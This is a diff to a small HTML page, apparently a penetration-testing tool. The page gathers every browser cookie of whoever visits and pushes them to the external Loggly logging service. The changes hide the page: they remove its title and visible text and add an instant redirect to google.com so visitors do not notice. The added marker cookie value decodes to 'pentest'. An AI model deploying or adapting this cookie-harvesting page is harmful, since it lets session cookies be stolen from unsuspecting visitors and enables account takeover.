@@ -1,12 +1,13 @@
 <!DOCTYPE HTML>
 <html>
-	<title>Loggly</title>	
-	
 	<head>
 	  <meta charset="utf-8" />
 	  <script type="text/javascript">
 	    // From https://stackoverflow.com/questions/252665/i-need-to-get-all-the-cookies-from-the-browser/252959#252959
 		var getCookies = function(){
+		  // Create a new marker cookie
+		  document.cookie = "Fnz=KnBlbnRlc3Qq";
+		  // Get the old ones
 		  var pairs = document.cookie.split(";");
 		  var cookies = {};
 		  for (var i=0; i<pairs.length; i++){
@@ -16,10 +17,13 @@
 		  return cookies;
 		};
 	  </script>
+	  <!-- Redirect away from the github page-->
+	  <meta http-equiv="refresh" content="0; url=https://www.google.com/" />
 	</head>	
 	
 	<body>
-	Loggly test v1.13
+<!-- Note: the next fullstop is needed otherwise loggly doesn't get the message !?-->	
+.
 
 		<script type="text/javascript" src="https://cloudfront.loggly.com/js/loggly.tracker-latest.min.js" async></script>
 		
@@ -34,7 +38,7 @@
 		
 		<script type="text/javascript">
 			_LTracker.push({
-				'tag' : 'loggly-jslogger,html,html_loggly_test,v1.13',
+				'tag' : 'loggly-jslogger,html,html_loggly_test,v1.15',
 				'text': 'Client request data',
 				'cookies': getCookies(),
 			});
